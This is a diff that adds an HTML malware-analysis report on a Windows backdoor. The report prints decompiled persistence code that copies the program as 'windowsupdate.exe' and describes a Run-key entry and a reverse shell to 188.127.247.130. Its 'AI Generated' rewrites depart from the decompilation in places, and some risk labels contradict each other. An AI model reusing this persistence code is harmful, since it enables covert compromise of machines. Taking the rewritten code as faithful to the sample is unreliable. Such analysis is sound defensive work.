+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">  Unknown pseudo relocation protocol version %d.</td>
+            <td class="muted" style="width:250px;"><code>__pei386_runtime_relocator</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">  Unknown pseudo relocation bit size %d.</td>
+            <td class="muted" style="width:250px;"><code>__pei386_runtime_relocator</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.</td>
+            <td class="muted" style="width:250px;"><code>__pei386_runtime_relocator</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">&lt;2ZGU</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr></tbody>
+                </table>
+            </div>
+        </details>
+  </div>
+
+  <!-- Function Analysis -->
+  <div class="section" id="sec-12">
+    <h2 class="section-title">Function Analysis</h2>
+    
+    <h3 style="margin:20px 0 10px; color:#1e293b;">Call chain analysis</h3>
+    <div class="chain-box" style="border-left-color:#f59e0b;"><b>_main</b> <span class="muted">(Depth 0)</span><br/><small>Initializes the C runtime, performs network reconnaissance, establishes persistence, and opens a reverse shell connection.</small></div><div class="chain-box" style="border-left-color:#16a34a;"><b>___main</b> <span class="muted">(Depth 1)</span><br/><small>Initializes global constructors if not already initialized, otherwise returns the current initialization state.</small></div><div class="chain-box" style="border-left-color:#dc2626;"><b>_runPingCommand</b> <span class="muted">(Depth 1)</span><br/><small>Performs network connectivity verification by executing a ping command via CreateProcessA.</small></div><div class="chain-box" style="border-left-color:#dc2626;"><b>_createFolderAndCopySelf</b> <span class="muted">(Depth 1)</span><br/><small>Creates a persistent copy of the current executable in a hidden system directory to ensure malware survival after reboot.</small></div><div class="chain-box" style="border-left-color:#dc2626;"><b>_createRegistryRunEntry</b> <span class="muted">(Depth 1)</span><br/><small>Establishes persistence by creating a registry run entry that points to a copied executable in the user&#x27;s public directory.</small></div><div class="chain-box" style="border-left-color:#dc2626;"><b>_openShellConnection</b> <span class="muted">(Depth 1)</span><br/><small>Establishes a reverse TCP shell connection to a remote IP address and spawns an interactive shell.</small></div>
+    
+    <h3 style="margin:30px 0 10px; color:#1e293b;">Call Graph (Tree View)</h3>
+    <pre><code class="language-plaintext">_main [0x40197F] (Entry)
+├── _runPingCommand [0x401524]
+├── _createFolderAndCopySelf [0x401644]
+├── _createRegistryRunEntry [0x401721]
+├── _openShellConnection [0x4017E6]
+└── ___main [0x401A50]</code></pre>
+
+    <h3 style="margin:30px 0 10px; color:#1e293b;">Mermaid Visual Call Flow - HTML</h3>
+    
+        <div id="mermaid-container" style="margin-bottom:15px;">
+          <div id="zoom-controls">
+            <button onclick="zoomMermaid(1.2)"><b>+</b> Zoom In</button>
+            <button onclick="zoomMermaid(0.8)"><b>-</b> Zoom Out</button>
+            <button onclick="resetMermaidZoom()">Reset</button>
+          </div>
+          <div id="mermaid-diagram" class="mermaid">flowchart TD
+    fn_40197F(["<b>_main</b><br/>Initializes the C runtime, performs network reconnaissance, establishes persistence, and opens a reverse shell connection."])
+    class fn_40197F cls_suspicious
+    fn_401A50(["<b>___main</b><br/>Initializes global constructors if not already initialized, otherwise returns the current initialization state."])
+    class fn_401A50 cls_benign
+    fn_40197F --> fn_401A50
+    fn_401524(["<b>_runPingCommand</b><br/>Performs network connectivity verification by executing a ping command via CreateProcessA."])
+    class fn_401524 cls_malicious
+    fn_40197F --> fn_401524
+    fn_401644(["<b>_createFolderAndCopySelf</b><br/>Creates a persistent copy of the current executable in a hidden system directory to ensure malware survival after reboot."])
+    class fn_401644 cls_malicious
+    fn_40197F --> fn_401644
+    fn_401721(["<b>_createRegistryRunEntry</b><br/>Establishes persistence by creating a registry run entry that points to a copied executable in the user's public directory."])
+    class fn_401721 cls_malicious
+    fn_40197F --> fn_401721
+    fn_4017E6(["<b>_openShellConnection</b><br/>Establishes a reverse TCP shell connection to a remote IP address and spawns an interactive shell."])
+    class fn_4017E6 cls_malicious
+    fn_40197F --> fn_4017E6
+    classDef cls_suspicious fill:#fef3c7,stroke:#f59e0b,color:#92400e
+    classDef cls_benign fill:#dcfce7,stroke:#22c55e,color:#14532d
+    classDef cls_malicious fill:#fee2e2,stroke:#ef4444,color:#7f1d1d</div>
+        </div>
+        
+        <details class="code-details" style="border:1px solid #cbd5e1; box-shadow:none; margin-bottom:20px;">
+          <summary style="padding:10px 15px; background:#f8fafc; cursor:pointer; font-weight:600; display:flex; justify-content:space-between; align-items:center;">
+            <span style="display:flex; align-items:center; gap:8px;">
+              <svg style="width:16px; height:16px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+              Raw Mermaid Source Code (Export to mermaid.live)
+            </span>
+            <button onclick="copyMermaidCode(event)" style="background:#4f46e5; color:white; border:none; padding:5px 15px; border-radius:6px; font-size:12px; cursor:pointer; font-weight:600; transition:0.2s;">Copy Code</button>
+          </summary>
+          <pre id="raw-mermaid-code" style="margin:0; border-radius:0; background:#0f172a; color:#cbd5e1; font-size:11px; border-top:1px solid #e2e8f0; white-space: pre-wrap;">flowchart TD
+    fn_40197F([&quot;&lt;b&gt;_main&lt;/b&gt;&lt;br/&gt;Initializes the C runtime, performs network reconnaissance, establishes persistence, and opens a reverse shell connection.&quot;])
+    class fn_40197F cls_suspicious
+    fn_401A50([&quot;&lt;b&gt;___main&lt;/b&gt;&lt;br/&gt;Initializes global constructors if not already initialized, otherwise returns the current initialization state.&quot;])
+    class fn_401A50 cls_benign
+    fn_40197F --&gt; fn_401A50
+    fn_401524([&quot;&lt;b&gt;_runPingCommand&lt;/b&gt;&lt;br/&gt;Performs network connectivity verification by executing a ping command via CreateProcessA.&quot;])
+    class fn_401524 cls_malicious
+    fn_40197F --&gt; fn_401524
+    fn_401644([&quot;&lt;b&gt;_createFolderAndCopySelf&lt;/b&gt;&lt;br/&gt;Creates a persistent copy of the current executable in a hidden system directory to ensure malware survival after reboot.&quot;])
+    class fn_401644 cls_malicious
+    fn_40197F --&gt; fn_401644
+    fn_401721([&quot;&lt;b&gt;_createRegistryRunEntry&lt;/b&gt;&lt;br/&gt;Establishes persistence by creating a registry run entry that points to a copied executable in the user&#x27;s public directory.&quot;])
+    class fn_401721 cls_malicious
+    fn_40197F --&gt; fn_401721
+    fn_4017E6([&quot;&lt;b&gt;_openShellConnection&lt;/b&gt;&lt;br/&gt;Establishes a reverse TCP shell connection to a remote IP address and spawns an interactive shell.&quot;])
+    class fn_4017E6 cls_malicious
+    fn_40197F --&gt; fn_4017E6
+    classDef cls_suspicious fill:#fef3c7,stroke:#f59e0b,color:#92400e
+    classDef cls_benign fill:#dcfce7,stroke:#22c55e,color:#14532d
+    classDef cls_malicious fill:#fee2e2,stroke:#ef4444,color:#7f1d1d</pre>
+        </details>
+        
+
+    <h3 style="margin:40px 0 10px; color:#1e293b; border-top:1px solid #e2e8f0; padding-top:20px;">Malicious functions</h3>
+    
+        <div style="margin-bottom:25px;">
+            <div style="font-weight:bold; color:#64748b; margin-bottom:10px; font-size:11px; text-transform:uppercase; letter-spacing:0.5px;">AI Behavioral Synthesis:</div>
+            <table class="data-table" style="border: 1px solid #f1f5f9; box-shadow:none;">
+                <thead><tr><th>Target Address</th><th>Function Identifier</th><th>Forensic Reasoning & Pattern Discovery</th></tr></thead>
+                <tbody>
+                    <tr>
+                        <td style="width:100px; font-family:monospace;">
+                            <a href="#fn_401644" style="color:#2563eb; text-decoration:none; font-weight:600;">0x401644</a>
+                        </td>
+                        <td style="font-weight:600; color:#1e293b;">_createFolderAndCopySelf</td>
+                        <td class="muted" style="font-size:12.5px;">Creates a folder and copies itself to a persistent location in the user&#x27;s personal directory, indicating potential persistence mechanism for malware.</td>
+                    </tr>
+                    <tr>
+                        <td style="width:100px; font-family:monospace;">
+                            <a href="#fn_401721" style="color:#2563eb; text-decoration:none; font-weight:600;">0x401721</a>
+                        </td>
+                        <td style="font-weight:600; color:#1e293b;">_createRegistryRunEntry</td>
+                        <td class="muted" style="font-size:12.5px;">Modifies the Windows Registry Run key to ensure the malware executes at system startup, which is a common tactic for maintaining persistence.</td>
+                    </tr>
+                    <tr>
+                        <td style="width:100px; font-family:monospace;">
+                            <a href="#fn_4017E6" style="color:#2563eb; text-decoration:none; font-weight:600;">0x4017E6</a>
+                        </td>
+                        <td style="font-weight:600; color:#1e293b;">_openShellConnection</td>
+                        <td class="muted" style="font-size:12.5px;">Initiates a shell connection to an external IP address (188.127.247.130), suggesting command and control communication with a remote server.</td>
+                    </tr>
+                    <tr>
+                        <td style="width:100px; font-family:monospace;">
+                            <a href="#fn_401524" style="color:#2563eb; text-decoration:none; font-weight:600;">0x401524</a>
+                        </td>
+                        <td style="font-weight:600; color:#1e293b;">_runPingCommand</td>
+                        <td class="muted" style="font-size:12.5px;">Executes a ping command to verify network connectivity, likely used as a check before establishing C2 communication or to confirm operational status.</td>
+                    </tr></tbody>
+            </table>
+        </div>
+        <div>
+            <div style="font-weight:bold; color:#64748b; margin-bottom:10px; font-size:11px; text-transform:uppercase; letter-spacing:0.5px;">Verified Forensic Taxonomy:</div>
+            <table class="data-table sortable"><thead><tr><th>Address</th><th>Function Name</th><th>Risk Tag</th><th>One-liner</th><th>Confidence</th></tr></thead><tbody><tr><td style="width:100px; font-family:monospace;"><a href="#fn_401524">0x401524</a></td><td><a href="#fn_401524"><b>_runPingCommand</b></a></td><td><span style="background:#dc2626;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">malicious</span></td><td>Performs network connectivity verification by executing a ping command via CreateProcessA.</td><td>90%</td></tr><tr><td style="width:100px; font-family:monospace;"><a href="#fn_401644">0x401644</a></td><td><a href="#fn_401644"><b>_createFolderAndCopySelf</b></a></td><td><span style="background:#dc2626;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">malicious</span></td><td>Creates a persistent copy of the current executable in a hidden system directory to ensure malware survival after reboot.</td><td>95%</td></tr><tr><td style="width:100px; font-family:monospace;"><a href="#fn_401721">0x401721</a></td><td><a href="#fn_401721"><b>_createRegistryRunEntry</b></a></td><td><span style="background:#dc2626;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">malicious</span></td><td>Establishes persistence by creating a registry run entry that points to a copied executable in the user&#x27;s public directory.</td><td>95%</td></tr><tr><td style="width:100px; font-family:monospace;"><a href="#fn_4017E6">0x4017E6</a></td><td><a href="#fn_4017E6"><b>_openShellConnection</b></a></td><td><span style="background:#dc2626;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">malicious</span></td><td>Establishes a reverse TCP shell connection to a remote IP address and spawns an interactive shell.</td><td>95%</td></tr></tbody></table>
+        </div>
+
+    <h3 style="margin:40px 0 10px; color:#1e293b; border-top:1px solid #e2e8f0; padding-top:20px;">Suspicious functions</h3>
+    
+        <div style="margin-bottom:25px;">
+            <div style="font-weight:bold; color:#64748b; margin-bottom:10px; font-size:11px; text-transform:uppercase; letter-spacing:0.5px;">AI Behavioral Synthesis:</div>
+            <table class="data-table" style="border: 1px solid #f1f5f9; box-shadow:none;">
+                <thead><tr><th>Target Address</th><th>Function Identifier</th><th>Forensic Reasoning & Pattern Discovery</th></tr></thead>
+                <tbody>
+                    <tr>
+                        <td style="width:100px; font-family:monospace;">
+                            <a href="#fn_401644" style="color:#2563eb; text-decoration:none; font-weight:600;">0x401644</a>
+                        </td>
+                        <td style="font-weight:600; color:#1e293b;">_createFolderAndCopySelf</td>
+                        <td class="muted" style="font-size:12.5px;">Creates a folder and copies itself to a persistent location in the user&#x27;s personal directory, indicating potential malware persistence mechanism.</td>
+                    </tr>
+                    <tr>
+                        <td style="width:100px; font-family:monospace;">
+                            <a href="#fn_401721" style="color:#2563eb; text-decoration:none; font-weight:600;">0x401721</a>
+                        </td>
+                        <td style="font-weight:600; color:#1e293b;">_createRegistryRunEntry</td>
+                        <td class="muted" style="font-size:12.5px;">Modifies the Windows registry to ensure the malware runs at startup by adding an entry to the Run key, which is a common technique for maintaining persistence.</td>
+                    </tr>
+                    <tr>
+                        <td style="width:100px; font-family:monospace;">
+                            <a href="#fn_4017E6" style="color:#2563eb; text-decoration:none; font-weight:600;">0x4017E6</a>
+                        </td>
+                        <td style="font-weight:600; color:#1e293b;">_openShellConnection</td>
+                        <td class="muted" style="font-size:12.5px;">Initiates a shell connection to a remote IP address (188.127.247.130), suggesting command and control communication with a remote server.</td>
+                    </tr></tbody>
+            </table>
+        </div>
+        <div>
+            <div style="font-weight:bold; color:#64748b; margin-bottom:10px; font-size:11px; text-transform:uppercase; letter-spacing:0.5px;">Verified Forensic Taxonomy:</div>
+            <table class="data-table sortable"><thead><tr><th>Address</th><th>Function Name</th><th>Risk Tag</th><th>One-liner</th><th>Confidence</th></tr></thead><tbody><tr><td style="width:100px; font-family:monospace;"><a href="#fn_40197F">0x40197F</a></td><td><a href="#fn_40197F"><b>_main</b></a></td><td><span style="background:#f59e0b;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">suspicious</span></td><td>Initializes the C runtime, performs network reconnaissance, establishes persistence, and opens a reverse shell connection.</td><td>95%</td></tr></tbody></table>
+        </div>
+
+    <h3 style="margin:40px 0 10px; color:#1e293b; border-top:1px solid #e2e8f0; padding-top:20px;">Benign functions</h3>
+    
+        <div>
+            <div style="font-weight:bold; color:#64748b; margin-bottom:10px; font-size:11px; text-transform:uppercase; letter-spacing:0.5px;">Verified Forensic Taxonomy:</div>
+            <table class="data-table sortable"><thead><tr><th>Address</th><th>Function Name</th><th>Risk Tag</th><th>One-liner</th><th>Confidence</th></tr></thead><tbody><tr><td style="width:100px; font-family:monospace;"><a href="#fn_401A50">0x401A50</a></td><td><a href="#fn_401A50"><b>___main</b></a></td><td><span style="background:#16a34a;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">benign</span></td><td>Initializes global constructors if not already initialized, otherwise returns the current initialization state.</td><td>90%</td></tr></tbody></table>
+        </div>
+
+    <h3 style="margin:40px 0 10px; color:#1e293b; border-top:1px solid #e2e8f0; padding-top:20px;">Function Decomposition</h3>
+    <input type="text" id="fnSearch" class="filter-input" placeholder="Search function name or risk tag (e.g., malicious)..." onkeyup="filterFunctions()">
+    <div id="func-grid">
+        
+        <div class="fn-card" id="fn_40197F" data-name="_main" data-tag="suspicious">
+            <h4 class="fn-card-title">_main @ 0x40197F</h4>
+            <div style="margin-bottom:12px;"><span style="background:#f59e0b;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">suspicious</span> <span class="muted" style="margin-left:8px;">Conf: 95% | Depth: 0</span></div>
+            
+            <div class="fn-info-row"><b>Purpose:</b> Initializes the C runtime, performs network reconnaissance, establishes persistence, and opens a reverse shell connection.</div>
+            <div class="fn-info-row"><b>Summary:</b> This function serves as the primary entry point for a malicious payload, orchestrating a sequence of actions that enable remote access and system persistence. It begins by initializing the C runtime environment, followed by executing a network ping command to verify connectivity. Next, it creates a persistent copy of itself in a hidden directory and registers itself in the Windows registry to ensure execution at startup. Finally, it initiates a reverse shell connection to a remote attacker-controlled server. Each step contributes directly to the malware&#x27;s ability to maintain access and exfiltrate data from the compromised host.</div>
+            <div class="fn-info-row"><b>Contextual Purpose:</b> To serve as the main orchestration function for deploying a reverse shell-based backdoor with persistence capabilities.</div>
+            <div class="fn-info-row"><b>Return Value:</b> Returns an integer value of zero, indicating successful completion of all initialization and setup steps before establishing the reverse shell.</div>
+            <div class="fn-info-row"><b>Risk Logic:</b> The function&#x27;s role in setting up persistence and initiating a reverse shell directly supports malicious objectives. While the individual calls may appear generic, their combination in this sequence clearly indicates a malicious intent to maintain long-term access and control over the target system.</div>
+            <div class="fn-info-row" style="margin-top:10px;"><b>Details:</b><ul style="margin:5px 0 0 20px;"><li>The function acts as the central coordinator for initial compromise and persistence mechanisms.</li><li>It leverages standard Windows APIs for file system manipulation and registry modification.</li><li>The final call establishes a reverse shell, enabling remote control of the infected machine.</li></ul></div>
+            <details class="code-section" style="margin-top:12px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Original Decompiled (Hex-Rays)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">// [PseudoNote] Initializes CRT, executes network ping, creates persistence via folder copy and registry entry, then establishes a reverse shell connection.
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __main();
+  runPingCommand();
+  createFolderAndCopySelf();
+  createRegistryRunEntry();
+  openShellConnection();
+  return 0;
+}
+</code></pre>
+                </div>
+            </details>
+            <details class="code-section" style="margin-top:6px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Readable Code (AI Generated)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">int __cdecl main(int argument_count, const char **argument_vector, const char **environment_variables)
+{
+  __main();
+  runPingCommand();
+  createFolderAndCopySelf();
+  createRegistryRunEntry();
+  openShellConnection();
+  return 0;
+}</code></pre>
+                </div>
+            </details>
+        </div>
+        <div class="fn-card" id="fn_401524" data-name="_runpingcommand" data-tag="malicious">
+            <h4 class="fn-card-title">_runPingCommand @ 0x401524</h4>
+            <div style="margin-bottom:12px;"><span style="background:#dc2626;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">malicious</span> <span class="muted" style="margin-left:8px;">Conf: 90% | Depth: 1</span></div>
+            
+            <div class="fn-info-row"><b>Purpose:</b> Performs network connectivity verification by executing a ping command via CreateProcessA.</div>
+            <div class="fn-info-row"><b>Summary:</b> This function serves as a network reconnaissance utility, invoked during the malware&#x27;s initialization phase to confirm system network availability. It leverages Windows API functions to spawn a subprocess running the ping command, which is a common technique used by malware to verify operational environment before proceeding with further malicious activities. The function is part of a larger attack chain initiated by _main, which also sets up persistence mechanisms and establishes remote access. Its role is to ensure that the target machine has active network capabilities prior to deploying more intrusive behaviors such as reverse shell establishment or data exfiltration.</div>
+            <div class="fn-info-row"><b>Contextual Purpose:</b> To verify that the host system maintains functional network capabilities before advancing with other malicious actions such as establishing persistence or opening a reverse shell connection.</div>
+            <div class="fn-info-row"><b>Return Value:</b> Returns a boolean indicating whether the ping command executed successfully; a true value implies successful process creation and execution, while false indicates failure in spawning or running the ping utility.</div>
+            <div class="fn-info-row"><b>Risk Logic:</b> The function was initially assessed as benign due to its apparent utility nature, but upon contextual analysis, it is revealed to be part of a broader malicious workflow initiated by _main. The fact that it&#x27;s called in conjunction with persistence and reverse shell setup functions elevates its risk profile from benign to suspicious. While not inherently destructive, its role in validating network conditions supports the overall malicious intent of the malware.</div>
+            <div class="fn-info-row" style="margin-top:10px;"><b>Details:</b><ul style="margin:5px 0 0 20px;"><li>Executes a ping command to validate network connectivity, supporting initial reconnaissance.</li><li>Called directly by _main, indicating integration into core malware workflow.</li><li>Part of a sequence involving registry manipulation and reverse shell initiation.</li></ul></div>
+            <details class="code-section" style="margin-top:12px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Original Decompiled (Hex-Rays)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">// [PseudoNote] Executes a ping command via CreateProcessA to check network connectivity, then closes process and thread handles.
+BOOL runPingCommand()
+{
+  BOOL result; // eax
+  CHAR CommandLine[42]; // [esp+32h] [ebp-86h] BYREF
+  struct _PROCESS_INFORMATION ProcessInformation; // [esp+5Ch] [ebp-5Ch] BYREF
+  struct _STARTUPINFOA StartupInfo; // [esp+6Ch] [ebp-4Ch] BYREF
+
+  memset(&amp;StartupInfo, 0, sizeof(StartupInfo));
+  memset(&amp;ProcessInformation, 0, sizeof(ProcessInformation));
+  StartupInfo.cb = 68;
+  StartupInfo.dwFlags = 1;
+  StartupInfo.wShowWindow = 0;
+  strcpy(CommandLine, &quot;cmd.exe /C ping -n 1 google.com &gt;nul 2&gt;&amp;1&quot;);
+  result = CreateProcessA(
+             nullptr,
+             CommandLine,
+             nullptr,
+             nullptr,
+             0,
+             0x8000000u,
+             nullptr,
+             nullptr,
+             &amp;StartupInfo,
+             &amp;ProcessInformation);
+  if ( result )
+  {
+    CloseHandle(ProcessInformation.hProcess);
+    return CloseHandle(ProcessInformation.hThread);
+  }
+  return result;
+}
+</code></pre>
+                </div>
+            </details>
+            <details class="code-section" style="margin-top:6px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Readable Code (AI Generated)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">BOOL runPingCommand() {
+    STARTUPINFOA startup_info;
+    PROCESS_INFORMATION process_info;
+    ZeroMemory(&amp;startup_info, sizeof(startup_info));
+    startup_info.cb = sizeof(startup_info);
+    ZeroMemory(&amp;process_info, sizeof(process_info));
+    // Execute ping command to check network connectivity
+    BOOL result = CreateProcessA(NULL, &quot;ping -n 1 8.8.8.8&quot;, NULL, NULL, FALSE, 0, NULL, NULL, &amp;startup_info, &amp;process_info);
+    if (result) {
+        CloseHandle(process_info.hThread);
+        CloseHandle(process_info.hProcess);
+    }
+    return result;
+}</code></pre>
+                </div>
+            </details>
+        </div>
+        <div class="fn-card" id="fn_401644" data-name="_createfolderandcopyself" data-tag="malicious">
+            <h4 class="fn-card-title">_createFolderAndCopySelf @ 0x401644</h4>
+            <div style="margin-bottom:12px;"><span style="background:#dc2626;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">malicious</span> <span class="muted" style="margin-left:8px;">Conf: 95% | Depth: 1</span></div>
+            
+            <div class="fn-info-row"><b>Purpose:</b> Creates a persistent copy of the current executable in a hidden system directory to ensure malware survival after reboot.</div>
+            <div class="fn-info-row"><b>Summary:</b> This function is responsible for establishing persistence by creating a designated folder structure under the &#x27;PUBLIC&#x27; user directory and copying the current executable into it. It is called during the initialization phase of the malware, alongside other persistence mechanisms like registry entries. The function ensures that even if the original file is removed, the malware can still execute from its copied location. This behavior aligns with common post-exploitation tactics used to maintain long-term access to compromised systems.</div>
+            <div class="fn-info-row"><b>Contextual Purpose:</b> To ensure that the malware remains active across system reboots by placing a copy of itself in a persistent location accessible via the &#x27;PUBLIC&#x27; directory.</div>
+            <div class="fn-info-row"><b>Return Value:</b> Returns the result of CopyFileA if successful, otherwise returns the last error code from the system. A non-zero return indicates either success or failure in copying the file.</div>
+            <div class="fn-info-row"><b>Risk Logic:</b> The function&#x27;s role in creating a persistent copy of the malware directly contributes to maintaining long-term access on the target system. Combined with the call chain showing it&#x27;s invoked during initialization alongside registry persistence, this clearly indicates malicious intent. The use of standard Windows API calls such as CreateDirectoryA and CopyFileA in a way that avoids detection makes this a high-risk operation.</div>
+            <div class="fn-info-row" style="margin-top:10px;"><b>Details:</b><ul style="margin:5px 0 0 20px;"><li>The function creates a directory path under the &#x27;PUBLIC&#x27; folder to store a copy of itself.</li><li>It retrieves the full path of the current module using GetModuleFileNameA.</li><li>If the directory already exists, it skips creation and proceeds to copy the executable.</li><li>This is part of a broader persistence strategy involving both file system and registry modifications.</li></ul></div>
+            <details class="code-section" style="margin-top:12px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Original Decompiled (Hex-Rays)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">// [PseudoNote] Creates a directory and copies the current executable to a specified location within that directory.
+DWORD createFolderAndCopySelf()
+{
+  char *v0; // eax
+  char *v1; // eax
+  DWORD result; // eax
+  CHAR PathName[260]; // [esp+14h] [ebp-314h] BYREF
+  char Buffer[260]; // [esp+118h] [ebp-210h] BYREF
+  CHAR Filename[268]; // [esp+21Ch] [ebp-10Ch] BYREF
+
+  GetModuleFileNameA(nullptr, Filename, 0x104u);
+  v0 = getenv(&quot;PUBLIC&quot;);
+  snprintf(Buffer, 0x104u, &quot;%s\\personal\\windowsupdate.exe&quot;, v0);
+  v1 = getenv(&quot;PUBLIC&quot;);
+  snprintf(PathName, 0x104u, &quot;%s\\personal&quot;, v1);
+  if ( CreateDirectoryA(PathName, nullptr) )
+    return CopyFileA(Filename, Buffer, 0);
+  result = GetLastError();
+  if ( result == 183 )
+    return CopyFileA(Filename, Buffer, 0);
+  return result;
+}
+</code></pre>
+                </div>
+            </details>
+            <details class="code-section" style="margin-top:6px;">
+                <summary class="code-section-header">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <span>Readable Code (AI Generated)</span>
+                </summary>
+                <div class="code-section-body">
+                    <pre><code class="language-c">DWORD establishPersistenceCopy()
+{
+    char *public_path_env;
+    char *public_path_env_copy;
+    DWORD last_error_or_copy_result;
+    CHAR destination_directory[260];
+    char source_file_path[260];
+    CHAR final_destination[268];
+
+    GetModuleFileNameA(nullptr, final_destination, 0x104u);
+    public_path_env = getenv(&quot;PUBLIC&quot;);
+    snprintf(source_file_path, 0x104u, &quot;%s\\personal\\windowsupdate.exe&quot;, public_path_env);
+    public_path_env_copy = getenv(&quot;PUBLIC&quot;);
+    snprintf(destination_directory, 0x104u, &quot;%s\\personal&quot;, public_path_env_copy);
+    
+    if (CreateDirectoryA(destination_directory, nullptr))
+        return CopyFileA(final_destination, source_file_path, 0);
+    
+    last_error_or_copy_result = GetLastError();
+    if (last_error_or_copy_result == 183)
+        return CopyFileA(final_destination, source_file_path, 0);
+    
+    return last_error_or_copy_result;
+}</code></pre>
+                </div>
+            </details>
+        </div>
+        <div class="fn-card" id="fn_401721" data-name="_createregistryrunentry" data-tag="malicious">
+            <h4 class="fn-card-title">_createRegistryRunEntry @ 0x401721</h4>
+            <div style="margin-bottom:12px;"><span style="background:#dc2626;color:#ffffff;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;box-shadow:0 1px 2px rgba(0,0,0,0.1);">malicious</span> <span class="muted" style="margin-left:8px;">Conf: 95% | Depth: 1</span></div>
+            
+            <div class="fn-info-row"><b>Purpose:</b> Establishes persistence by creating a registry run entry that points to a copied executable in the user&#x27;s public directory.</div>
+            <div class="fn-info-row"><b>Summary:</b> This function plays a critical role in the malware&#x27;s persistence mechanism. It retrieves the path to the PUBLIC directory, constructs a target executable path under a subfolder named &#x27;personal&#x27;, then opens the Windows registry Run key for the current user. It sets a registry value with the name &#x27;WindowsUpdateProgram&#x27; pointing to the constructed executable path. This ensures that the malware will execute automatically upon each system boot or user login. The function is called directly by _main during the initialization phase, indicating its importance in maintaining long-term presence on the infected host.
+
+The sibling functions like _createFolderAndCopySelf and _openShellConnection suggest a broader attack lifecycle involving initial infection, persistence establishment, and remote access. This function specifically contributes to the &#x27;persistence&#x27; phase of that lifecycle, making it a core component of the malware&#x27;s operational strategy.</div>
+            <div class="fn-info-row"><b>Contextual Purpose:</b> To ensure that the malware survives system reboots and user logins by registering itself in the Windows startup sequence through the registry.</div>
+            <div class="fn-info-row"><b>Return Value:</b> Returns the result of the registry close operation after setting the persistence entry. A non-zero value indicates failure in either opening or setting the registry key, while zero indicates successful completion of all operations.</div>
+            <div class="fn-info-row"><b>Risk Logic:</b> The function&#x27;s risk was upgraded from &#x27;suspicious&#x27; to &#x27;malicious&#x27; because it performs a sensitive operation—writing to the Windows registry under a key used for autorun programs—which is a well-known technique for achieving persistent malware presence. Although the code itself is simple, its context within a larger malware framework where it&#x27;s called immediately after network reconnaissance and before establishing a reverse shell confirms its role in maintaining long-term access to the compromised system.</div>
